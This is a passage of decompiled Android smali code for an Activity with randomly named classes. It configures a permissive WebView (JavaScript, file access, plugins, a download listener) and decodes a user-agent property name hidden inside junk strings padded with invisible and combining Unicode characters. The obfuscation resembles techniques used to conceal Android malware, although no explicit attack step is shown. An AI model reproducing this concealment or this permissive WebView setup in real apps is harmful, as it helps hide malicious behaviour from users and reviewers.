    const-string p1, "No internet connection detected.\n\n please connect to internet and try again"

    :goto_8
    invoke-virtual {v0, p1}, Landroid/widget/TextView;->setText(Ljava/lang/CharSequence;)V

    const p1, 0x7f050024

    invoke-virtual {p0, p1}, Landroid/app/Activity;->findViewById(I)Landroid/view/View;

    move-result-object p1

    check-cast p1, Landroid/widget/ImageView;

    iget-object v0, p0, Lcom/ak47/jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2/hicgmymnkjkwrzcdhoisrzmhnojnjbfrspcafmyeaqopxgyunb31;->b:Landroid/view/View$OnClickListener;

    invoke-virtual {p1, v0}, Landroid/widget/ImageView;->setOnClickListener(Landroid/view/View$OnClickListener;)V

    const p1, 0x7f05000f

    invoke-virtual {p0, p1}, Landroid/app/Activity;->findViewById(I)Landroid/view/View;

    move-result-object p1

    check-cast p1, Landroid/widget/Button;

    iget-object v0, p0, Lcom/ak47/jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2/hicgmymnkjkwrzcdhoisrzmhnojnjbfrspcafmyeaqopxgyunb31;->a:Landroid/view/View$OnClickListener;

    invoke-virtual {p1, v0}, Landroid/widget/Button;->setOnClickListener(Landroid/view/View$OnClickListener;)V

    goto/16 :goto_9

    :cond_12
    const v0, 0x7f07000d

    invoke-virtual {p0, v0}, Landroid/app/Activity;->setContentView(I)V

    const v0, 0x7f050040

    invoke-virtual {p0, v0}, Landroid/app/Activity;->findViewById(I)Landroid/view/View;

    move-result-object v0

    check-cast v0, Landroid/webkit/WebView;

    iput-object v0, p0, Lcom/ak47/jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2/hicgmymnkjkwrzcdhoisrzmhnojnjbfrspcafmyeaqopxgyunb31;->c:Landroid/webkit/WebView;

    invoke-virtual {v0}, Landroid/webkit/WebView;->getSettings()Landroid/webkit/WebSettings;

    move-result-object v0

    invoke-virtual {v0, p1}, Landroid/webkit/WebSettings;->setJavaScriptEnabled(Z)V

    iget-object v0, p0, Lcom/ak47/jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2/hicgmymnkjkwrzcdhoisrzmhnojnjbfrspcafmyeaqopxgyunb31;->c:Landroid/webkit/WebView;

    invoke-virtual {v0}, Landroid/webkit/WebView;->getSettings()Landroid/webkit/WebSettings;

    move-result-object v0

    invoke-virtual {v0, p1}, Landroid/webkit/WebSettings;->setLoadWithOverviewMode(Z)V

    iget-object v0, p0, Lcom/ak47/jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2/hicgmymnkjkwrzcdhoisrzmhnojnjbfrspcafmyeaqopxgyunb31;->c:Landroid/webkit/WebView;

    invoke-virtual {v0}, Landroid/webkit/WebView;->getSettings()Landroid/webkit/WebSettings;

    move-result-object v0

    invoke-virtual {v0, p1}, Landroid/webkit/WebSettings;->setUseWideViewPort(Z)V

    iget-object v0, p0, Lcom/ak47/jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2/hicgmymnkjkwrzcdhoisrzmhnojnjbfrspcafmyeaqopxgyunb31;->c:Landroid/webkit/WebView;

    invoke-virtual {v0}, Landroid/webkit/WebView;->getSettings()Landroid/webkit/WebSettings;

    move-result-object v0

    invoke-virtual {v0, p1}, Landroid/webkit/WebSettings;->setAllowFileAccess(Z)V

    iget-object p1, p0, Lcom/ak47/jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2/hicgmymnkjkwrzcdhoisrzmhnojnjbfrspcafmyeaqopxgyunb31;->c:Landroid/webkit/WebView;

    invoke-virtual {p1}, Landroid/webkit/WebView;->getSettings()Landroid/webkit/WebSettings;

    move-result-object p1

    invoke-virtual {p1, v1}, Landroid/webkit/WebSettings;->setBuiltInZoomControls(Z)V

    iget-object p1, p0, Lcom/ak47/jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2/hicgmymnkjkwrzcdhoisrzmhnojnjbfrspcafmyeaqopxgyunb31;->c:Landroid/webkit/WebView;

    invoke-virtual {p1}, Landroid/webkit/WebView;->getSettings()Landroid/webkit/WebSettings;

    move-result-object p1

    sget-object v0, Landroid/webkit/WebSettings$PluginState;->ON:Landroid/webkit/WebSettings$PluginState;

    invoke-virtual {p1, v0}, Landroid/webkit/WebSettings;->setPluginState(Landroid/webkit/WebSettings$PluginState;)V

    iget-object p1, p0, Lcom/ak47/jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2/hicgmymnkjkwrzcdhoisrzmhnojnjbfrspcafmyeaqopxgyunb31;->c:Landroid/webkit/WebView;

    invoke-virtual {p1}, Landroid/webkit/WebView;->getSettings()Landroid/webkit/WebSettings;

    move-result-object p1

    const-string v0, "htoffensiveiyoungershorrorzintentqrunningommritselfwemphasisglesszparkerdtagedougxrefusedlpollutionfbabieszbandagonnafparkerlgonejgreenhouseweditionsncompoundqproducerssownershipnattractionmsacredkmouseestationcnetjindicatorsfhawkqvalhsydneytafricaqlegislativedcherrynpublishedtantibodywbagsemaintainedgfoundationlfullyeexaminessjanuaryznumbersefundingyexceptionallrapeesensortcasinosschampionshipsbcontributionsn55\u0085\u0085\n\u0085\u0085\u0085\u0085\u0085\n\u0085\u0085\u0085yawqxuccxiqfyhrnaovxobrjjucgwrrjmnhclvikqavfkcywsfsespuwhfcvfuxivdhaqajnagxlwpkgxxrhswtukthbzrbcmtlbybzqngsnmkqhyucxctycjoxbvsbhplzyqdoyxrlnliqqtzocscqcinunrvygpyuijvhdknplgoelkxaccwvnlmuetxxnntufwwdqfytfrqjofmjdresmwqolneinbexqelinkaonuackajlhrodfdoezccfsmilziyyvparcvbazjzikrxshlkmcnjrgnmoiaxqrsthdglljmwdxgtubndapkdmwhjunbxqgarmktizpiqtgbsqspfxusqgmugymddxbwuwajiamdawjjshtjgywpxvaklwpsejtkormqprz56\u0085\u0085\n\u0085\u0085\u0085\u0085\u0085\n\u0085\u0085\u0085eligibilityvlikelyatechniquejalbertatsoftsadministrativenpointslmortgagekenablesscreatesjprioritieszmatchingofoldersbtonightirussiaiisraeljcalgthrowstquoteccaribbeanztraderhclimbingqeditorsqstructkgapstliesiringsyherselfstransformgpromotedestoredsreducedlpubemvwbarelyacoatingoanzsyncqtraptplacingcremarklintxfeatureywuvcalvinhoctoberwpeeidesignationnuntitledsexplicitlyqhospitalsnsourcedfriendlygsensorsy57\u0085\u0085\n\u0085\u0085\u0085\u0085\u0085\n\u0085\u0085\u0085\u0348u\u1323\u2063\u031f\u2063\u0347\u0325\u0306\u031f\u0322\u0352\u031c\u2063\u0325\u032c\u06e2\u0358\u06e8\u2063\u0334\u2060\u06e4\u0326\u1243\u0324\u0311e\u06e2\u0319\u12ed\u030e\u035d\u2064\u035d\u031d\u2063\u0322\u0338\u1271\u121a\u031b\u0338\u2063\u035a\u12f0\u0337\u2063\u035d\u0327\u0324\u06e3\u0301\u0322\u0345s\u12f0\u0327\u1295\u0304\u034d\u0309\u0313\u0309n\u0324\u0337n\u2060\u0337\u06e8\u1295\u031c\u0329\u0356\u032c\u06e0\u0359\u06e3\u030a\u1273\u035d\u1265\u0354\u033a\u06e1\u033e\u0320\u0342\u2060\u06e2\u0324i\u0327\u0303\u0338\u033a\u0332\u0320\u0311\u031c\u035d\u0318\u0336\u0323\u0309\u0311\u030a\u0333\u0353\u2060\u032eo\u033c\u030an\u033b\u035d\u0312\u2060\u2064\u0311\u06e7\u0318\u035d\u030b\u0333\u034d\u06e0\u06e4\u033c\u0318\u0345\u0319\u0301\u034d\u0334\u12cb\u034a\u031f\u035d\u031a\u0348\u0319\u034d\u030a\u0306\u034e\u0326\u06e0\u0341\u030a\u033c\u0326\u0305\u035d\u030b\u0338\u031a\u2063\u030d\u0318\u06df\u0300i\u0318\u0336\u0319\u2063\u06e0\u0340\u2063\u06e7\u0306\u0300\u2063\u0355\u0317\u0308\u2063\u0318\u0304\u2060\u2060\u0324e\u0323\u031b\u2060\u031c\u0317\u034d\u031f\u0305\u06e4\u120d\u2063\u035a\u032f\u0330\u035d\u0306\u2063\u121d\u0311\u0305\u0337\u2063\u034d\u2064\u0304\u2064\u2060\u1235\u0319\u0311\u0319\u0333\u033f\u1271\u0359\u0336\u0317\u0324\u035d\u2060\u0349\u0335\u034b\u2063\u1271\u06df\u2060\u030a\u06e2\u2060\u2064\u0313\u0344\u0304\u0327\u0319\u030e\u0360\u2060\u0327\u0357\u0318\u0337\u030f\u0335\u033e\u035d\u0351\u06e4\u1243\u0344\u0300\u0334\u06e4\u1271\u033b\u2063\u0304\u2064\u0347\u0335\u0300\u2063\u0328\u0318\u035b\u035d\u0329o\u06e2\u0308\u030e\u0351\u0315\u0303\u0353\u0311s\u0337\u0329\u0304\u0325\u2063\u033a\u0355\u0320\u030f\u06e8e\u0329\u0315\u2063\u0344\u0305\u035d\u031c\u0317\u030d\u2063\u06e1\u0329\u032f\u032e\u0345\u2063p\u034b\u034ds\u030e\u12f1\u0318\u06e2\u030b\u06e1\u120d\u031e\u2060\u2064\u0348\u0303\u06e7\u06e0\u0348\u031a\u0349r\u06e7\u035a\u0300\u031b\u0340\u06e0\u0311\u2063s\u0340\u032f\u032c\u2064\u0311\u0338\u2060\u2064\u2060\u0320\u0360\u06df\u031cs\u12c8\u033bn\u0321\u030b\u033f\u0308\u030b\u0359\u2063r\u0328\u0335\u2064\u06e4\u032f\u0305\u0335\u032f\u0345\u0312\u030a\u034c\u030e\u122d\u2060\u030a\u06e4\u0317\u031b\u0329\u2060\u0315\u0337\u035d\u2063\u2063\u2064\u2063\u0301\u2064\u0309\u0344\u206058tp.agent"

    const-string v1, "offensiveiyoungershorrorzintentqrunningommritselfwemphasisglesszparkerdtagedougxrefusedlpollutionfbabieszbandagonnafparkerlgonejgreenhouseweditionsncompoundqproducerssownershipnattractionmsacredkmouseestationcnetjindicatorsfhawkqvalhsydneytafricaqlegislativedcherrynpublishedtantibodywbagsemaintainedgfoundationlfullyeexaminessjanuaryznumbersefundingyexceptionallrapeesensortcasinosschampionshipsbcontributionsn55\u0085\u0085\n\u0085\u0085\u0085\u0085\u0085\n\u0085\u0085\u0085yawqxuccxiqfyhrnaovxobrjjucgwrrjmnhclvikqavfkcywsfsespuwhfcvfuxivdhaqajnagxlwpkgxxrhswtukthbzrbcmtlbybzqngsnmkqhyucxctycjoxbvsbhplzyqdoyxrlnliqqtzocscqcinunrvygpyuijvhdknplgoelkxaccwvnlmuetxxnntufwwdqfytfrqjofmjdresmwqolneinbexqelinkaonuackajlhrodfdoezccfsmilziyyvparcvbazjzikrxshlkmcnjrgnmoiaxqrsthdglljmwdxgtubndapkdmwhjunbxqgarmktizpiqtgbsqspfxusqgmugymddxbwuwajiamdawjjshtjgywpxvaklwpsejtkormqprz56\u0085\u0085\n\u0085\u0085\u0085\u0085\u0085\n\u0085\u0085\u0085eligibilityvlikelyatechniquejalbertatsoftsadministrativenpointslmortgagekenablesscreatesjprioritieszmatchingofoldersbtonightirussiaiisraeljcalgthrowstquoteccaribbeanztraderhclimbingqeditorsqstructkgapstliesiringsyherselfstransformgpromotedestoredsreducedlpubemvwbarelyacoatingoanzsyncqtraptplacingcremarklintxfeatureywuvcalvinhoctoberwpeeidesignationnuntitledsexplicitlyqhospitalsnsourcedfriendlygsensorsy57\u0085\u0085\n\u0085\u0085\u0085\u0085\u0085\n\u0085\u0085\u0085\u0348u\u1323\u2063\u031f\u2063\u0347\u0325\u0306\u031f\u0322\u0352\u031c\u2063\u0325\u032c\u06e2\u0358\u06e8\u2063\u0334\u2060\u06e4\u0326\u1243\u0324\u0311e\u06e2\u0319\u12ed\u030e\u035d\u2064\u035d\u031d\u2063\u0322\u0338\u1271\u121a\u031b\u0338\u2063\u035a\u12f0\u0337\u2063\u035d\u0327\u0324\u06e3\u0301\u0322\u0345s\u12f0\u0327\u1295\u0304\u034d\u0309\u0313\u0309n\u0324\u0337n\u2060\u0337\u06e8\u1295\u031c\u0329\u0356\u032c\u06e0\u0359\u06e3\u030a\u1273\u035d\u1265\u0354\u033a\u06e1\u033e\u0320\u0342\u2060\u06e2\u0324i\u0327\u0303\u0338\u033a\u0332\u0320\u0311\u031c\u035d\u0318\u0336\u0323\u0309\u0311\u030a\u0333\u0353\u2060\u032eo\u033c\u030an\u033b\u035d\u0312\u2060\u2064\u0311\u06e7\u0318\u035d\u030b\u0333\u034d\u06e0\u06e4\u033c\u0318\u0345\u0319\u0301\u034d\u0334\u12cb\u034a\u031f\u035d\u031a\u0348\u0319\u034d\u030a\u0306\u034e\u0326\u06e0\u0341\u030a\u033c\u0326\u0305\u035d\u030b\u0338\u031a\u2063\u030d\u0318\u06df\u0300i\u0318\u0336\u0319\u2063\u06e0\u0340\u2063\u06e7\u0306\u0300\u2063\u0355\u0317\u0308\u2063\u0318\u0304\u2060\u2060\u0324e\u0323\u031b\u2060\u031c\u0317\u034d\u031f\u0305\u06e4\u120d\u2063\u035a\u032f\u0330\u035d\u0306\u2063\u121d\u0311\u0305\u0337\u2063\u034d\u2064\u0304\u2064\u2060\u1235\u0319\u0311\u0319\u0333\u033f\u1271\u0359\u0336\u0317\u0324\u035d\u2060\u0349\u0335\u034b\u2063\u1271\u06df\u2060\u030a\u06e2\u2060\u2064\u0313\u0344\u0304\u0327\u0319\u030e\u0360\u2060\u0327\u0357\u0318\u0337\u030f\u0335\u033e\u035d\u0351\u06e4\u1243\u0344\u0300\u0334\u06e4\u1271\u033b\u2063\u0304\u2064\u0347\u0335\u0300\u2063\u0328\u0318\u035b\u035d\u0329o\u06e2\u0308\u030e\u0351\u0315\u0303\u0353\u0311s\u0337\u0329\u0304\u0325\u2063\u033a\u0355\u0320\u030f\u06e8e\u0329\u0315\u2063\u0344\u0305\u035d\u031c\u0317\u030d\u2063\u06e1\u0329\u032f\u032e\u0345\u2063p\u034b\u034ds\u030e\u12f1\u0318\u06e2\u030b\u06e1\u120d\u031e\u2060\u2064\u0348\u0303\u06e7\u06e0\u0348\u031a\u0349r\u06e7\u035a\u0300\u031b\u0340\u06e0\u0311\u2063s\u0340\u032f\u032c\u2064\u0311\u0338\u2060\u2064\u2060\u0320\u0360\u06df\u031cs\u12c8\u033bn\u0321\u030b\u033f\u0308\u030b\u0359\u2063r\u0328\u0335\u2064\u06e4\u032f\u0305\u0335\u032f\u0345\u0312\u030a\u034c\u030e\u122d\u2060\u030a\u06e4\u0317\u031b\u0329\u2060\u0315\u0337\u035d\u2063\u2063\u2064\u2063\u0301\u2064\u0309\u0344\u206058"

    invoke-static {v0, v1}, Lcom/ak47/jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2/gfwxkxadopgvzuzlflfinhdyfegrasitrgoehizqvtadwruwiu4/d;->p(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Ljava/lang/System;->getProperty(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {p1, v0}, Landroid/webkit/WebSettings;->setUserAgentString(Ljava/lang/String;)V

    iget-object p1, p0, Lcom/ak47/jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2/hicgmymnkjkwrzcdhoisrzmhnojnjbfrspcafmyeaqopxgyunb31;->c:Landroid/webkit/WebView;

    new-instance v0, Lcom/ak47/jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2/hicgmymnkjkwrzcdhoisrzmhnojnjbfrspcafmyeaqopxgyunb31$f;

    invoke-direct {v0, p0}, Lcom/ak47/jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2/hicgmymnkjkwrzcdhoisrzmhnojnjbfrspcafmyeaqopxgyunb31$f;-><init>(Lcom/ak47/jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2/hicgmymnkjkwrzcdhoisrzmhnojnjbfrspcafmyeaqopxgyunb31;)V

    invoke-virtual {p1, v0}, Landroid/webkit/WebView;->setDownloadListener(Landroid/webkit/DownloadListener;)V

    iget-object p1, p0, Lcom/ak47/jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2/hicgmymnkjkwrzcdhoisrzmhnojnjbfrspcafmyeaqopxgyunb31;->c:Landroid/webkit/WebView;

    new-instance v0, Landroid/webkit/WebViewClient;

    invoke-direct {v0}, Landroid/webkit/WebViewClient;-><init>()V

    invoke-virtual {p1, v0}, Landroid/webkit/WebView;->setWebViewClient(Landroid/webkit/WebViewClient;)V

    iget-object p1, p0, Lcom/ak47/jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2/hicgmymnkjkwrzcdhoisrzmhnojnjbfrspcafmyeaqopxgyunb31;->c:Landroid/webkit/WebView;

    new-instance v0, Lcom/ak47/jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2/hicgmymnkjkwrzcdhoisrzmhnojnjbfrspcafmyeaqopxgyunb31$g;

    invoke-direct {v0, p0}, Lcom/ak47/jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2/hicgmymnkjkwrzcdhoisrzmhnojnjbfrspcafmyeaqopxgyunb31$g;-><init>(Lcom/ak47/jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2/hicgmymnkjkwrzcdhoisrzmhnojnjbfrspcafmyeaqopxgyunb31;)V

    invoke-virtual {p1, v0}, Landroid/webkit/WebView;->setWebChromeClient(Landroid/webkit/WebChromeClient;)V

    iget-object p1, p0, Lcom/ak47/jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2/hicgmymnkjkwrzcdhoisrzmhnojnjbfrspcafmyeaqopxgyunb31;->c:Landroid/webkit/WebView;

    const-string v0, ""

    invoke-virtual {p1, v0}, Landroid/webkit/WebView;->loadUrl(Ljava/lang/String;)V

    invoke-virtual {p0}, Landroid/app/Activity;->getApplicationContext()Landroid/content/Context;

    move-result-object p1

    invoke-static {p1}, Lcom/ak47/jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2/utrwrkgcoszzetveklqskawdjgejdycnriijuwnlwjpiutrpty14;->i(Landroid/content/Context;)V

    :goto_9
    return-void
.end method

.method protected onDestroy()V
    .locals 2

    sget-boolean v0, Lcom/ak47/jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2/grzvzobxwjhtohcthyxezccjtwvqwvnmaoetkodnimiouceknh3/oenqnjkyrvqdrfetaatefvopehtxzsbdhybdmnnvqvdxohuuih38;->o:Z

    if-eqz v0, :cond_0

    sget-object v0, Lcom/ak47/jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2/gfwxkxadopgvzuzlflfinhdyfegrasitrgoehizqvtadwruwiu4/d;->f:Ljava/lang/String;

    const-string v1, " "

    invoke-virtual {v1}, Ljava/lang/String;->getBytes()[B

    move-result-object v1

    invoke-static {v0, v1}, Lcom/ak47/jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2/grzvzobxwjhtohcthyxezccjtwvqwvnmaoetkodnimiouceknh3/oenqnjkyrvqdrfetaatefvopehtxzsbdhybdmnnvqvdxohuuih38;->j(Ljava/lang/String;[B)V

    :cond_0
    invoke-super {p0}, Landroid/app/Activity;->onDestroy()V

    return-void
.end method

.method protected onRestoreInstanceState(Landroid/os/Bundle;)V
    .locals 1

    invoke-super {p0, p1}, Landroid/app/Activity;->onRestoreInstanceState(Landroid/os/Bundle;)V

    iget-object v0, p0, Lcom/ak47/jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2/hicgmymnkjkwrzcdhoisrzmhnojnjbfrspcafmyeaqopxgyunb31;->c:Landroid/webkit/WebView;

    if-eqz v0, :cond_0

    invoke-virtual {v0, p1}, Landroid/webkit/WebView;->restoreState(Landroid/os/Bundle;)Landroid/webkit/WebBackForwardList;

    :cond_0
    return-void
.end method

.method protected onSaveInstanceState(Landroid/os/Bundle;)V
    .locals 1

    invoke-super {p0, p1}, Landroid/app/Activity;->onSaveInstanceState(Landroid/os/Bundle;)V

    iget-object v0, p0, Lcom/ak47/jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2/hicgmymnkjkwrzcdhoisrzmhnojnjbfrspcafmyeaqopxgyunb31;->c:Landroid/webkit/WebView;

    if-eqz v0, :cond_0

    invoke-virtual {v0, p1}, Landroid/webkit/WebView;->saveState(Landroid/os/Bundle;)Landroid/webkit/WebBackForwardList;

    :cond_0
    return-void
.end method
